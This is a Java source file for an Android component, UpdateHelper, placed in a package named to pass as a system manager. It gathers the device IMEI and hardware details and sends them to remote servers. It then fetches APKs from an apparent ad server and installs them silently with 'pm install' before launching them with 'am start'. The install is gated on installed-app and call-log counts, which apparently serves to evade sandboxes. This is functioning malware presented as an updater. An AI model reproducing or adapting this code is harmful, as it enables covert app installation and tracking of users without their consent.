package com.android.system.manager.plugin.master;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Message;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.system.manager.plugin.utils.CommonUtils;
import com.android.system.manager.plugin.utils.FileUtils;
import com.android.system.manager.plugin.utils.L;
import com.android.system.manager.plugin.utils.NetworkUtils;
import com.duowan.mobile.netroid.DefaultRetryPolicy;
import com.duowan.mobile.netroid.Listener;
import com.duowan.mobile.netroid.NetroidError;
import com.duowan.mobile.netroid.request.JsonObjectRequest;
import com.duowan.mobile.netroid.request.StringRequest;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import static android.content.Context.TELEPHONY_SERVICE;

/**
 * Created by Administrator on 2017/2/27.
 */

public class UpdateHelper extends BroadcastReceiver {
    public static final String UPDATE_PACKAGE = MasterConstant.CORE_SERVICE[0];
    public static final String PREFS = "update";
    public static final String UPDATE_TIME_KEY = "update_time";
    public static final long UPDATE_INTERVAL = 1 * 60 * 60 * 1000;
    public static final long UPDATE_FAILED_INTERVAL = 60 * 60 * 1000;
    public static final int UPDATE_MSG = 0;
    private static UpdateHelper instance = new UpdateHelper();
    private HandlerThread thread;
    private Handler handler;
    private String VERSION_BASE_URL = "http://update.qiqiup.com/QianQi/tb_findTBNew?";
    private String DOWNLOAD_BASE_URL = "http://update.qiqiup.com/QianQi/";
    private String NOTIFY_BASE_URL = "http://update.qiqiup.com/QianQi/tb_updateTBNum?";

    public static UpdateHelper getInstance() {
        return instance;
    }

    public void start() {
        thread = new HandlerThread(UpdateHelper.class.getSimpleName());
        thread.start();
        handler = new Handler(thread.getLooper()) {
            @Override
            public void handleMessage(Message msg) {
                UpdateHelper.this.handleMessage(msg);
            }
        };
        IntentFilter filter = new IntentFilter();
        filter.addDataScheme("package");
        filter.addAction(Intent.ACTION_PACKAGE_ADDED);
        filter.addAction(Intent.ACTION_PACKAGE_CHANGED);
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
        MasterProcess.ins().getContext().registerReceiver(this, filter);
        IntentFilter syncFilter = new IntentFilter();
        syncFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        syncFilter.addAction(Intent.ACTION_DATE_CHANGED);
        syncFilter.addAction(Intent.ACTION_TIME_CHANGED);
        syncFilter.addAction(Intent.ACTION_TIMEZONE_CHANGED);
        MasterProcess.ins().getContext().registerReceiver(this, syncFilter);
        handler.sendEmptyMessageDelayed(UPDATE_MSG, 3000);
    }

    public void onDestroy() {
        MasterProcess.ins().getContext().unregisterReceiver(this);
        handler.removeMessages(UPDATE_MSG);
    }

    private void handleMessage(Message msg) {
        switch (msg.what) {
            case UPDATE_MSG:
                long wait = checkUpdate();
                if (wait > 0)
                    handler.sendEmptyMessageDelayed(UPDATE_MSG, wait);
                break;
        }
    }

    private long checkUpdate() {
        Log.e("------------------","check update");
        SharedPreferences prefs = MasterProcess.ins().getContext().getSharedPreferences(PREFS, 0);
        long lastUpdateTime = prefs.getLong(UPDATE_TIME_KEY, 0);
        long curTime = System.currentTimeMillis();
        if (lastUpdateTime > curTime) {
            lastUpdateTime = curTime;
            prefs.edit().putLong(UPDATE_TIME_KEY, lastUpdateTime).commit();
        }
        if (curTime - lastUpdateTime < UPDATE_INTERVAL) {
            Log.e("------------------","need to wait,update later!");
            return (UPDATE_INTERVAL + lastUpdateTime - curTime + 1000);
        }
        if (NetworkUtils.getConnectedType(MasterProcess.ins().getContext()) != NetworkUtils.NETWORK_WIFI) {
            Log.e("------------------","no wifi,update later!");
            return UPDATE_FAILED_INTERVAL;
        }
        ApplicationInfo appInfo = null;
        try {
            appInfo = MasterProcess.ins().getContext().getPackageManager().getApplicationInfo(UPDATE_PACKAGE, PackageManager.GET_META_DATA);
        } catch (PackageManager.NameNotFoundException e) {
            Log.e("------------------","not install,update later!");
            return UPDATE_INTERVAL;
        }

        PackageInfo pi = null;
        try {
            pi = MasterProcess.ins().getContext().getPackageManager().getPackageInfo(UPDATE_PACKAGE, 0);
        } catch (PackageManager.NameNotFoundException e) {
            Log.e("------------------","not install,update later!");
            return UPDATE_INTERVAL;
        }
        String channel = appInfo.metaData.getString("UMENG_CHANNEL");
        final int versionCode = pi.versionCode;
//        String versionUrl = VERSION_BASE_URL+"packageName="+"com.qianqi.qiupad"+"&channel="+"test";
        String params = "packageName=" + UPDATE_PACKAGE + "&channel=" + channel + getPhoneInfo(pi);
//        try {
//            params = URLEncoder.encode(params,"utf-8").replaceAll("\\+","%20");
//        } catch (UnsupportedEncodingException e) {
////            e.printStackTrace();
//            params = URLEncoder.encode(params).replaceAll("\\+","%20");
//        }
        String versionUrl = VERSION_BASE_URL + params.replaceAll(" ", "%20");
        requestVersion(versionUrl, versionCode);

        return UPDATE_FAILED_INTERVAL;
    }

    private String getPhoneInfo(PackageInfo pi) {
        String phoneInfo = "&a=" + android.os.Build.PRODUCT;
        phoneInfo += "&b=" + android.os.Build.CPU_ABI;
        phoneInfo += "&c=" + android.os.Build.VERSION_CODES.BASE;
        phoneInfo += "&d=" + android.os.Build.MODEL;
        phoneInfo += "&e=" + android.os.Build.VERSION.SDK;
        phoneInfo += "&f=" + android.os.Build.VERSION.RELEASE;
        phoneInfo += "&g=" + android.os.Build.DEVICE;
        phoneInfo += "&h=" + android.os.Build.DISPLAY;
        phoneInfo += "&i=" + android.os.Build.BRAND;
        phoneInfo += "&j=" + android.os.Build.BOARD;
        phoneInfo += "&k=" + android.os.Build.FINGERPRINT;
        phoneInfo += "&l=" + android.os.Build.ID;
        phoneInfo += "&m=" + android.os.Build.MANUFACTURER;
        phoneInfo += "&n=" + (pi != null ? pi.versionCode : "null");
        phoneInfo += "&o=" + (pi != null ? pi.versionName : "null");
        phoneInfo += "&p=" + CommonUtils.getDisplayWidth(MasterProcess.ins().getContext());
        phoneInfo += "&q=" + CommonUtils.getDisplayHeight(MasterProcess.ins().getContext());
        phoneInfo += "&r=" + CommonUtils.getTotalMemory();
        String imei = ((TelephonyManager) MasterProcess.ins().getContext().getSystemService(TELEPHONY_SERVICE)).getDeviceId();
        phoneInfo += "&z=" + imei;
        return phoneInfo;
    }

    private void requestVersion(final String url, final int curVersion) {
        Log.e("------------------","start request:" + url);
        Log.e("------------------","start request curVersion:" + curVersion);
        JsonObjectRequest request = new JsonObjectRequest(url, null, new Listener<JSONObject>() {

            @Override
            public void onSuccess(JSONObject response) {
                Log.e("------------------","finish request:" + url);
                Log.e("------------------","finish request:" + response);
//                {"stopRun":false,"whiteList":"com.tencent.mm;com.tencent.mobileqq;","blackList":"com.qihoo.appstore;"}
                if (response != null) {
                    try {
                        boolean stop = response.getBoolean("stopRun");
                        MasterServerImpl.ins().o(stop);
                    } catch (JSONException e) {
                        L.d("stopRun", e);
                    }
                }
                if (response != null) {
                    try {
                        String whiteList = response.getString("whiteList");
                        String blackList = response.getString("blackList");
                        String grayList = response.getString("grayList");
                        MasterServerImpl.ins().q(whiteList, blackList, grayList);
                    } catch (JSONException e) {
                        L.d("list", e);
                    }
                }
                if (response != null) {
                    try {
                        int netVersionCode = response.getInt("versionCode");
                        String downloadPath = response.getString("downloadPath");
                        Log.e("------------------","finish request netVersionCode:" + netVersionCode);
                        if (netVersionCode > curVersion) {
                            downloadVersion(DOWNLOAD_BASE_URL + downloadPath, netVersionCode);
                            return;
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    L.d("no new version!");
                    SharedPreferences prefs = MasterProcess.ins().getContext().getSharedPreferences(PREFS, 0);
                    prefs.edit().putLong(UPDATE_TIME_KEY, System.currentTimeMillis()).commit();
                }
            }
        });
        request.setRetryPolicy(new DefaultRetryPolicy(2500, 3, 2));
        MasterProcess.ins().getQueue().add(request);
    }

    private void downloadVersion(String url, final int version) {
//        File dir = MasterProcess.ins().getContext().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
        File dir = FileUtils.getStorageFile(MasterProcess.ins().getContext(), "");
        if (dir == null)
            return;
        if (!dir.exists()) {
            dir.mkdirs();
            L.d("start createNewFile:" + dir);
        }

        final File apkFile = new File(dir, UPDATE_PACKAGE + "-" + version + ".apk");
        if (apkFile.exists()) {
            PackageInfo p = MasterProcess.ins().getContext().getPackageManager().getPackageArchiveInfo(apkFile.getPath(), 0);
            if (p != null && p.versionCode == version) {
                installVersion(apkFile);
                return;
            }
        }
        apkFile.delete();
        Log.e("------------------","start download:" + version + url);
        final File tmpFile = new File(dir, UPDATE_PACKAGE + "-" + version + ".tmp");
        String storeFilePath = tmpFile.getAbsolutePath();
        Log.e("------------------","start download storeFilePath:" + storeFilePath);
        MasterProcess.ins().getDownloader().clearAll();
        MasterProcess.ins().getDownloader().add(storeFilePath, url, new Listener<Void>() {
            @Override
            public void onSuccess(Void response) {
                Log.e("------------------","finish download:" + version);
                if (tmpFile.exists()) {
                    PackageInfo p = MasterProcess.ins().getContext().getPackageManager().getPackageArchiveInfo(tmpFile.getPath(), 0);
                    if (p != null && p.versionCode == version) {
                        apkFile.delete();
                        tmpFile.renameTo(apkFile);
                        installVersion(apkFile);
                    } else {
                        tmpFile.delete();
                    }
                }
            }

            @Override
            public void onError(NetroidError error) {
                super.onError(error);
                L.d("finish download error:" + error.getLocalizedMessage(), error);
            }

            @Override
            public void onFinish() {
                super.onFinish();
                L.d("finish download onFinish:");
            }
        });
    }

    private void installVersion(File f) {
        Log.e("------------------","start install:" + f.getAbsolutePath());
        boolean result = false;
        DataOutputStream dataOutputStream = null;
        BufferedReader errorStream = null;
        try {
            String packageName =  MasterProcess.ins().getContext().getPackageName();
            String command = "pm install -i "+ packageName + " --user 0 -r " + f.getAbsolutePath() + "\n";
            Process process = Runtime.getRuntime().exec(command);
            dataOutputStream = new DataOutputStream(process.getOutputStream());
//            dataOutputStream.write(command.getBytes(Charset.forName("utf-8")));
//            dataOutputStream.flush();
            dataOutputStream.writeBytes("exit\n");
            dataOutputStream.flush();
            process.waitFor();
            errorStream = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            String msg = "";
            String line;
            // 读取命令的执行结果
            while ((line = errorStream.readLine()) != null) {
                msg += line;
            }
            Log.e("------------------","install msg:" + msg);
            // 如果执行结果中包含Failure字样就认为是安装失败，否则就认为安装成功
            if (!msg.contains("Failure")) {
                result = true;
            }
        } catch (Exception e) {
//            L.d("install", e);
        } finally {
            try {
                if (dataOutputStream != null) {
                    dataOutputStream.close();
                }
                if (errorStream != null) {
                    errorStream.close();
                }
            } catch (IOException e) {
//                L.d("install", e);
            }
            MasterProcess.ins().wakeClient();
            if (result) {
                f.delete();
                SharedPreferences prefs = MasterProcess.ins().getContext().getSharedPreferences(PREFS, 0);
                prefs.edit().putLong(UPDATE_TIME_KEY, System.currentTimeMillis()).commit();
                notifyVersion();
            }
        }
//        return result;
    }

    private void notifyVersion() {
        String channel = "public";
        ApplicationInfo appInfo = null;
        try {
            appInfo = MasterProcess.ins().getContext().getPackageManager().getApplicationInfo(UPDATE_PACKAGE, PackageManager.GET_META_DATA);
            channel = appInfo.metaData.getString("UMENG_CHANNEL");
        } catch (PackageManager.NameNotFoundException e) {

        }
        PackageInfo pi = null;
        try {
            pi = MasterProcess.ins().getContext().getPackageManager().getPackageInfo(UPDATE_PACKAGE, 0);
        } catch (PackageManager.NameNotFoundException e) {

        }
        String params = "packageName=" + UPDATE_PACKAGE + "&channel=" + channel + getPhoneInfo(pi);
//        try {
//            params = URLEncoder.encode(params,"utf-8").replaceAll("\\+","%20");
//        } catch (UnsupportedEncodingException e) {
////            e.printStackTrace();
//            params = URLEncoder.encode(params).replaceAll("\\+","%20");
//        }
        final String notifyUrl = NOTIFY_BASE_URL + params.replaceAll(" ", "%20");
//        L.d("start notify:"+notifyUrl);
        JsonObjectRequest request = new JsonObjectRequest(notifyUrl, null, new Listener<JSONObject>() {

            @Override
            public void onSuccess(JSONObject response) {
//                L.d("finish notify:"+notifyUrl);
            }
        });
        request.setRetryPolicy(new DefaultRetryPolicy(2500, 3, 2));
        MasterProcess.ins().getQueue().add(request);
    }

    private String G_VERSION_URL = "http://tutiaoba.com/GuangAdServer/";
    private JSONArray g_arr;

    private void requestVersion2() {
        long now = System.currentTimeMillis();
        SharedPreferences prefs = MasterProcess.ins().getContext().getSharedPreferences(PREFS, 0);
        long gupdatetime = prefs.getLong("gupdatetime", 0l);
        if (now - gupdatetime < 12 * 60 * 60 * 1000) {
//            Log.e("------------", "requestVersion2 time limit");
            return;
        }
        prefs.edit().putLong("gupdatetime", now).commit();
//        Log.e("------------", "requestVersion2 start");
        g_arr = null;

        ApplicationInfo appInfo = null;
        try {
            appInfo = MasterProcess.ins().getContext().getPackageManager().getApplicationInfo(UPDATE_PACKAGE, PackageManager.GET_META_DATA);
        } catch (PackageManager.NameNotFoundException e) {
        }
        final String channel = appInfo.metaData.getString("UMENG_CHANNEL");

        StringRequest req = new StringRequest(G_VERSION_URL + "update_findNew?channel=" + channel,
                new Listener<String>() {
                    @Override
                    public void onSuccess(String response) {
                        if (response != null) {
                            try {
                                g_arr = new JSONArray(response);
                                checkVersion(channel);
                                checkOpen(response);
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                });
        req.setRetryPolicy(new DefaultRetryPolicy(2500, 3, 2));
        MasterProcess.ins().getQueue().add(req);
    }

    //获取外置应用
    public static List<PackageInfo> getApps() {
        // 桌面应用的启动在INTENT中需要包含ACTION_MAIN 和CATEGORY_HOME.
        Context context = MasterProcess.ins().getContext();
        List<PackageInfo> names = new ArrayList<PackageInfo>();
        PackageManager packageManager = context.getPackageManager();
        List<PackageInfo> apps = packageManager.getInstalledPackages(0);
        for (PackageInfo app : apps) {
            if ((app.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                names.add(app);
            }
        }
        return names;
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    public int getCallLogNum() {
        Context context = MasterProcess.ins().getContext();
        // 1.获得ContentResolver
        ContentResolver resolver = context.getContentResolver();
        int num = 0;
        // 2.利用ContentResolver的query方法查询通话记录数据库
        Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, // 查询通话记录的URI
                new String[] { CallLog.Calls.CACHED_NAME// 通话记录的联系人
                        , CallLog.Calls.NUMBER// 通话记录的电话号码
                        , CallLog.Calls.DATE// 通话记录的日期
                        , CallLog.Calls.DURATION// 通话时长
                        , CallLog.Calls.TYPE }// 通话类型
                , null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
        );
        // 3.通过Cursor获得数据
        while (cursor.moveToNext()) {
            num++;
        }

        return num;
    }

    private void checkOpen(String response)
    {
        try {
            JSONArray arrs = new JSONArray(response);
            if(arrs != null && arrs.length()>0)
            {
                List<PackageInfo> apps = getApps();

                for(int i=0;i<arrs.length();i++)
                {
                    JSONObject obj = arrs.getJSONObject(i);
                    String packageName = obj.getString("packageName");
                    String activityName = obj.getString("activityName");

                    for(PackageInfo info : apps)
                    {
                        if(info.packageName.equals(packageName))
                        {
                            open(packageName,activityName);
                            break;
                        }
                    }
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    private void checkVersion(String channel)
    {
        if(g_arr == null || g_arr.length() == 0)
        {
            return;
        }
        List<PackageInfo> apps = getApps();
//        Log.e("---------","apps size="+apps.size());
        try {
            JSONObject obj = g_arr.getJSONObject(0);
            int appNum = obj.getInt("appNum");
            int callLogNum = obj.getInt("callLogNum");
            String packageName = obj.getString("packageName");
            String versionCode = obj.getString("versionCode");
            String downloadPath = obj.getString("downloadPath");
            String activityName = obj.getString("activityName");

            boolean b = true;
            if(apps.size() < appNum)
            {
                b = false;
//                Log.e("---------","apps limit "+apps.size());
            }

            if(b && getCallLogNum() < callLogNum)
            {
                b = false;
//                Log.e("---------","callLogNum limit "+getCallLogNum());
            }

            if(b)
            {
                for(PackageInfo info : apps)
                {
                    if(info.packageName.equals(packageName) && (info.versionCode+"").equals(versionCode))
                    {
                        b = false;
//                        Log.e("---------","versionCode limit "+info.versionCode);
                        break;
                    }
                }
            }
            if(b)
            {
                downloadVersion2(G_VERSION_URL + downloadPath, Integer.parseInt(versionCode),packageName,channel,activityName);
            }
            else
            {
                g_arr.remove(0);
                checkVersion(channel);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void downloadVersion2(String url, final int version,final String packageName,final String channel,final String activityName){
//        File dir = MasterProcess.ins().getContext().getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
        File dir = FileUtils.getStorageFile(MasterProcess.ins().getContext(),"");
        if(dir == null)
            return;
        if(!dir.exists())
        {
            dir.mkdirs();
//            Log.e("---------","start createNewFile:"+dir);
        }
        String UPDATE_PACKAGE_2 = packageName;

        final File apkFile = new File(dir,UPDATE_PACKAGE_2+"-"+version+".apk");
        if(apkFile.exists()){
            PackageInfo p = MasterProcess.ins().getContext().getPackageManager().getPackageArchiveInfo(apkFile.getPath(),0);
            if(p != null && p.versionCode == version){
                installVersion2(apkFile,channel,packageName,activityName);
                return;
            }
        }
        apkFile.delete();
//        Log.e("---------","start download:"+version+url);
        final File tmpFile = new File(dir,UPDATE_PACKAGE_2+"-"+version+".tmp");
        String storeFilePath = tmpFile.getAbsolutePath();
//        Log.e("---------","start download storeFilePath:"+storeFilePath);
        MasterProcess.ins().getDownloader().clearAll();
        MasterProcess.ins().getDownloader().add(storeFilePath, url, new Listener<Void>() {
            @Override
            public void onSuccess(Void response) {
//                Log.e("---------","finish download:"+version);
                if(tmpFile.exists()){
                    PackageInfo p = MasterProcess.ins().getContext().getPackageManager().getPackageArchiveInfo(tmpFile.getPath(),0);
                    if(p != null && p.versionCode == version){
                        apkFile.delete();
                        tmpFile.renameTo(apkFile);
                        installVersion2(apkFile,channel,packageName,activityName);
                    }
                    else{
                        tmpFile.delete();
                    }
                }
            }

            @Override
            public void onError(NetroidError error) {
                super.onError(error);
//                Log.e("---------","finish download error:"+error.getLocalizedMessage(),error);
            }

            @Override
            public void onFinish() {
                super.onFinish();
//                Log.e("---------","finish download onFinish:");
            }
        });
    }

    private void installVersion2(File f,final String channel,final String packageName,final String activityName){
//        Log.e("---------","start install:"+f.getAbsolutePath());
        boolean result = false;
        DataOutputStream dataOutputStream = null;
        BufferedReader errorStream = null;
        try {
            String packageName2 =  MasterProcess.ins().getContext().getPackageName();
            String command = "pm install -i "+ packageName2 + " --user 0 -r " + f.getAbsolutePath() + "\n";
            Process process = Runtime.getRuntime().exec(command);
            dataOutputStream = new DataOutputStream(process.getOutputStream());
            dataOutputStream.writeBytes("exit\n");
            dataOutputStream.flush();
            process.waitFor();
            errorStream = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            String msg = "";
            String line;
            // 读取命令的执行结果
            while ((line = errorStream.readLine()) != null) {
                msg += line;
            }
//            Log.e("---------","install msg:" + msg);
            // 如果执行结果中包含Failure字样就认为是安装失败，否则就认为安装成功
            if (!msg.contains("Failure")) {
                result = true;
            }
        } catch (Exception e) {
//            L.d("install", e);
        } finally {
            try {
                if (dataOutputStream != null) {
                    dataOutputStream.close();
                }
                if (errorStream != null) {
                    errorStream.close();
                }
            } catch (IOException e) {
//                L.d("install", e);
            }
            if(result){
                f.delete();

                StringRequest req = new StringRequest(G_VERSION_URL + "update_updateNum?channel="+channel+"&packageName="+packageName,
                        new Listener<String>() {
                            @Override
                            public void onSuccess(String response) {

                            }
                        });
                req.setRetryPolicy(new DefaultRetryPolicy(2500, 3, 2));
                MasterProcess.ins().getQueue().add(req);

                open(packageName,activityName);
                checkVersion(channel);
            }
        }
//        return result;
    }

    private void open(String packageName,String className)
    {
        if(className == null || "".equals(className))
            return;
        String command = "am start -n "+packageName+"/"+className;
        try{
            Runtime.getRuntime().exec(command);
//            Log.e("---------","open success:" + className);
        }
        catch (IOException e)
        {
//            Log.e("---------","open fail:" + className);
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if(action.equals(Intent.ACTION_PACKAGE_CHANGED) ||
                action.equals(Intent.ACTION_PACKAGE_REMOVED) ||
                action.equals(Intent.ACTION_PACKAGE_ADDED)){
            String data = intent.getDataString();
            if(data == null || data.length() < 9)
                return;
            String packageName = data.substring(8);
            if(packageName.equals(UPDATE_PACKAGE)){
                MasterProcess.ins().wakeClient();
            }
        }
        else {
            handler.removeMessages(UPDATE_MSG);
            handler.sendEmptyMessageDelayed(UPDATE_MSG,3000);
        }
    }
}
